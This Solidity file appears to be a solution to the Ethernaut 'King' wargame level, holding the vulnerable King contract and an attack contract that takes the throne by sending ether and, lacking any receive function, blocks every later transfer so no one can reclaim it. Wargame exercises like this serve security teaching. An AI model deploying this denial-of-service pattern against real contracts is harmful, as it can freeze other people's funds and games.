// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EthernautKingAttack {
    EthernautKing target;

    constructor() payable {}

    function attack(address _addr) public payable {
        (bool sent, ) = payable(_addr).call{value: address(this).balance}("");
        require(sent, "attack failed");
    }
}

contract EthernautKing {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
